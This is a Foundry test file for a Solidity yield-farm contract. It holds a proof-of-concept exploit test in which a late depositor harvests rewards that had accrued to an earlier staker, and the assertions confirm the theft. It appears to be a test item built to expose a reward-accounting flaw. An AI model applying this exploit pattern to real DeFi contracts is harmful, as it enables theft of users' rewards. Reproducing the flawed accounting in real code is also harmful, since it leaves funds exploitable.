// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C10.sol";
contract C10Test is Test {
    TokenC10 lp; TokenC10 frm; FarmC10 farm;
    address alice = makeAddr("alice"); address bob = makeAddr("bob");
    function setUp() public {
        lp = new TokenC10("LP Token", "LP"); frm = new TokenC10("Farm Reward", "FRM");
        farm = new FarmC10(lp, frm, 1e18);
        frm.mint(address(farm), 1_000_000e18);
        lp.mint(alice, 100e18); lp.mint(bob, 100e18);
        vm.prank(alice); lp.approve(address(farm), type(uint256).max);
        vm.prank(bob);   lp.approve(address(farm), type(uint256).max);
    }
    function test_exploit_lateDepositStealsAccruedRewards() public {
        vm.prank(alice); farm.deposit(100e18);
        vm.warp(block.timestamp + 100);                 // 100e18 accrues to alice
        vm.startPrank(bob); farm.deposit(100e18); farm.harvest(); vm.stopPrank();
        assertEq(frm.balanceOf(bob), 100e18, "bob harvested rewards for 0s staked");
        assertEq(farm.pendingReward(alice), 100e18, "alice still owed the same");
    }
}
